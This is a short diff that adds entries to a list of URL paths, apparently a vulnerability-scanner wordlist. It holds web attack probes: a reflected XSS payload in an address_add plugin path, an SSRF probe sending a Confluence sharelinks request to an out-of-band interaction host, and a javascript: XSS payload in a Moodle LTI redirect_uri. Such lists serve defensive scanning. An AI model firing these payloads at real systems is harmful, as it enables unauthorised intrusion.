@@ -154,3 +154,5 @@
 /plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 /securityRealm/signup
 /jenkins/securityRealm/signup
+/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
+/mod/lti/auth.php?redirect_uri=javascript:alert(
